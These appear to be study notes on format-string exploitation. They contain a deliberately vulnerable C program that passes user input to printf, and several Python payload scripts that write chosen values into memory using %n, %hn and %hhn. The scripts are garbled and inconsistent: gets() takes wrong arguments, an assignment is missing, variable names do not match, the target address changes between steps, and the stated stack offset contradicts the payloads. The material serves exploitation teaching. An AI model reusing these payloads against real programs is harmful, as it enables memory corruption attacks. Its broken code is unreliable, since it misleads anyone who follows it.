# More Control Over the Writing Process

**what.c**

```c
#include<stdio.h>

int num = 0;

void main(){
        char buffer[512];
        printf("Input: ");
        gets(buffer,sizeof(buffer),stdin);
        printf("What your wrote: ");
        printf(buffer);
        printf("\nnum = 0x%x\n",num);
}
```

- Here our objective is to exploit the printf and write 0x41424344 to the global integer `num`
- These global variables are either stored in the bss or the data segment in memory
- Since this variable is uninitialized data, this will be stored in the .bss section
- The address of this section is not randomized

- gcc requires a specific PIE (Position Independent Execution) flags to take full advantage of ASLR

## Creating the Exploit

- Get the address of the num variable

```
 objdump -t what | grep num
000000000000401c g     O .bss	0000000000000004              num
```

- Find out the direct parameter access index for an address placed at the beginning of our payload

```py
buf = "AAAAAAAA"
buf += " %p " *10
print(buf)
```


```
python3 asd.py > x && cat x | ./what 
Input: What your wrote: AAAAAAAA 0x55deb313e00c  (nil)  (nil)  0x7ffd3b708ce0  0x11  0x4141414141414141  0x2070252020702520  0x2070252020702520  0x2070252020702520  0x2070252020702520 
num = 0x0
```

- We notice that it is at the 6th position

- Change the exploit script to write to that location

```py
buf = "\x0c\x40\x00\x00"
buf += "%7$n"
print(buf)
```

- This will write these 4 bytes to the location

- Write the value 41 to the address

```py
value = 0x41
buf = "\x0c\x40\x00\x00"
buf += "%" + str(val - len(buf)) + "x%7$n"
print(buf)
```

- We can also write 0x414243 to the address

```py
value = 0x414243
buf = "\x0c\x40\x00\x00"
buf += "%" + str(val - len(buf)) + "x%7$n"
print(buf)
```

- Writing so many bytes will take too long
- To solve this we will make use of short bytes

## Using short bytes

- Short here relates to short integer type which is of 2 bytes length
- To tell printf to write only 2 bytes we can use length modifiers
- Instead of using `%n` if we use `%hn` it will tell printf to write 2 bytes instead of 4
- This will allow the code to not take too long to write the same address in the memory
- Writing one byte at a time will too long

**asd.py**

```py
import struct

where = 0x0804a048

buf = ""
buf += struct.pack("<I",where)
buf += struct.pack("<I",where+2)

what 0x4344 - len(buf)

buf += "%" + str(what) + "x"
buf += "%7$hn"

what = 0x14142 - 0x4344

buf += "%" + str(what) + "x"
buf += "%8$hn"

print(buf)
```


- In the line

```
what = 0x14142 - 0x4344
```

- We want to write 0x4142 but it is smaller than 0x4344 there there will be problem with the value in the higher 16 bits
- To correct this we add 1 to the left of it.
- What it does is results in a value that will end up adding just enough characters to our payload to complete 0x41424344

- Rewrite the code to account for the changing DPA

```py

import struct

what  = 0x41424344
where = 0x0804a048
DPA   = 7

where_high = where + 2
what_low = what & 0x0000ffff
what_high = (what & 0xffff0000) >> 16

buf = ""
buf += struct.pack("<I",where)
buf += struct.pack("<I",where_high)

count = what_low - len(buf)

buf += "%" + str(count) + "p"
buf += "%" + str(DPA) + "$hn"

if what_high < what_low:   count = (0x10000 + what_high) - what_low
else:                      count = what_high - what_low

buf += "%" + str(count) + "p"
buf += "%" + str(DPA+1) + "$hn"

print buf
```

- We can also write byte by byte

```py
import struct

where = 0x804a048

buf = ""
buf += struct.pack("<I",where)
buf += struct.pack("<I",where+1)
buf += struct.pack("<I",where+2)
buf += struct.pack("<I",where+3)

what = 0x44 - len(buf)

buf += "%" + str(what) + "x"
buf += "%7$hhn"

what = 0x143 - 0x44

buf += "%" + str(what) + "x"
buf += "%8$hhn"

what = 0x142 - 0x43

buf += "%" + str(what) + "x"
buf += "%9$hhn"

what = 0x141 - 0x42

buf += "%" + str(what) + "x"
buf += "%10$hhn"

print buf
```

- Writing one byte at a time creates a longer payload which may cause problem with the byte limit
- Writing 4 bytes at a time takes too long
- Therefore we write 2 bytes at a time